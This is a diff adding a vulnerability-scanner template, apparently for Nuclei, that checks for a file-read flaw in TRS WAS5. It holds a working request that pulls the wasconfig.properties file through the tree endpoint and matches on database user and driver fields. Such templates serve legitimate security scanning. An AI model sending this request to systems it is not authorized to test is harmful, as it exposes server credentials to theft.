@@ -1,0 +1,40 @@
+id: poc-yaml-trs-was5-file-read
+
+info:
+  name: poc-yaml-trs-was5-file-read
+  author: Aurora
+  severity: medium
+  tags: xray-converted,lfi,ct-474124
+  reference:
+    - https://github.com/m0xbf/onlinetools-copy/blob/1b943250be6ac39c30c012b5d018cd363c36e85c/scanner/plugins/cms/trs/trs_was5_config_disclosure.py
+
+http:
+  - raw:
+      - |
+        GET /was5/web HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/was5/admin/images"
+  - raw:
+      - |
+        GET /was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sysdriver"
+          - "sysuser"
